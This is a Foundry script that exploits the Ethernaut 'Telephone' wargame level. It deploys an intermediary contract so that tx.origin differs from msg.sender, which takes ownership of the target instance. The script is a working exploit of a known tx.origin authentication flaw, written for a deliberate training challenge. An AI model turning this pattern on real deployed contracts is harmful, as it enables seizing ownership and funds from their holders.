// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {ITelephone} from "../src/interfaces/ITelephone.sol";
import {TelephoneAttack} from "../src/attackers/TelephoneAttack.sol";

contract TelephoneScript is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address instance = vm.envAddress("INSTANCE_ADDRESS");
        address attackerWallet = vm.addr(privateKey);

        ITelephone target = ITelephone(instance);

        console2.log("--- Telephone Exploit ---");
        console2.log("Target Instance:", instance);
        console2.log("Current Owner:", target.owner());
        console2.log("Attacker Wallet:", attackerWallet);

        vm.startBroadcast(privateKey);

        // 1. Deploy intermediate attacker contract
        TelephoneAttack attackContract = new TelephoneAttack(instance);
        console2.log("Deployed TelephoneAttack at:", address(attackContract));

        // 2. Call through the intermediate contract:
        // Inside Telephone: tx.origin = attackerWallet, msg.sender = address(attackContract)
        // tx.origin != msg.sender is TRUE!
        attackContract.attack(attackerWallet);

        vm.stopBroadcast();

        console2.log("Updated Owner:", target.owner());
        require(target.owner() == attackerWallet, "Exploit failed: owner not transferred");
        console2.log(">>> SUCCESS! Ownership claimed! Submit instance in Ethernaut. <<<");
    }
}
